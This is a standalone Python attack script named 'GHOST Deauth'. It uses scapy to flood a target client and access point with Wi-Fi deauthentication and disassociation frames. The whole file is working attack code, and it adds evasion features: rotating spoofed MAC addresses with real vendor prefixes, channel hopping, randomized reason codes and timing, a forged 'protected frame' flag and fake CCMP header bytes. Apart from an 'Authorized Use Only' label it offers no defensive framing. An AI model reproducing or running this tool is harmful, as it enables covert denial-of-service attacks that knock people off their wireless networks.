#!/usr/bin/env python3
import random
import time
import argparse
import sys
import os
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Elt
from threading import Thread, Event
import secrets

class GhostDeauth:
    def __init__(self):
        self.stop_event = Event()
        self.sent = 0
        self.oui_pool = [
            '00:0C:29', '00:50:56', '00:1A:73', '3C:AB:8E',
            'A4:4C:C8', 'DC:A6:32', 'F0:18:98', 'B4:2E:99'
        ]
        self.reasons = [3, 4, 5, 7, 8]
        self.channels = [1, 6, 11]  # Common 2.4GHz channels
        self.current_channel = 1
        self.fake_ssid = "HOME-" + str(random.randint(100, 999))

    def rotate_mac(self):
        """Generates MAC with valid OUI and random suffix"""
        return f"{random.choice(self.oui_pool)}:{secrets.token_hex(3)[:2]}:{secrets.token_hex(3)[:2]}"

    def channel_hopper(self):
        """Periodically switch channels"""
        while not self.stop_event.is_set():
            self.current_channel = random.choice(self.channels)
            os.system(f"iwconfig {self.interface} channel {self.current_channel}")
            time.sleep(random.uniform(0.5, 2.0))

    def encrypt_packet(self, pkt):
        """Add fake WPA2/3 encryption headers"""
        # Simulate CCMP header (WPA2)
        if random.random() > 0.7:
            pkt = pkt/Raw(b'\x01\x00' + secrets.token_bytes(6))  # Fake PN/KeyID
        return pkt

    def build_ghost_frame(self, target, ap):
        """Construct frame with SSID cloaking"""
        # Randomize between Deauth (0x0C) and Disassoc (0x0A)
        subtype = 0x0C if random.random() > 0.3 else 0x0A
        
        dot11 = Dot11(
            addr1=target,
            addr2=self.rotate_mac(),
            addr3=ap,
            subtype=subtype,
            FCfield=0x01  # Indicates "protected frame"
        )
        
        # 30% chance to include fake SSID element
        if random.random() > 0.7:
            dot11 = dot11/Dot11Elt(ID=0, info=self.fake_ssid)
        
        return dot11

    def execute(self, target, ap, iface, count=0, verbose=False):
        """Main attack loop"""
        self.interface = iface
        Thread(target=self.channel_hopper, daemon=True).start()
        
        try:
            while not self.stop_event.is_set() and (count == 0 or self.sent < count):
                # Build stealth frame
                frame = self.build_ghost_frame(target, ap)
                reason = random.choice(self.reasons)
                pkt = RadioTap()/frame/Dot11Deauth(reason=reason)
                
                # Encrypt 60% of packets
                if random.random() > 0.4:
                    pkt = self.encrypt_packet(pkt)
                
                # Send with random power/delay
                sendp(
                    pkt,
                    iface=iface,
                    verbose=verbose,
                    inter=random.uniform(0.05, 0.3)
                )
                self.sent += 1
                
                # Random long pause (5% chance)
                if random.random() > 0.95:
                    time.sleep(random.uniform(1.5, 4.0))
                    
        except KeyboardInterrupt:
            print("\n[!] Ghost mode deactivated")
        finally:
            self.stop_event.set()

def main():
    parser = argparse.ArgumentParser(description="GHOST Deauth - Authorized Use Only")
    parser.add_argument("-t", "--target", required=True, help="Client MAC")
    parser.add_argument("-a", "--ap", required=True, help="Access Point MAC")
    parser.add_argument("-i", "--interface", required=True, help="Monitor interface")
    parser.add_argument("-c", "--count", type=int, default=0, help="Packet limit (0=infinite)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Show packets (DANGER)")
    
    args = parser.parse_args()
    
    # Security checks
    if os.geteuid() != 0:
        print("[!] Root required (sudo)")
        sys.exit(1)
    if args.interface not in get_if_list():
        print("[!] Invalid interface")
        sys.exit(1)
    
    # Start attack
    ghost = GhostDeauth()
    try:
        ghost.execute(args.target, args.ap, args.interface, args.count, args.verbose)
    except KeyboardInterrupt:
        ghost.stop_event.set()
    print(f"[*] Ghost packets delivered: {ghost.sent}")

if __name__ == "__main__":
    main()

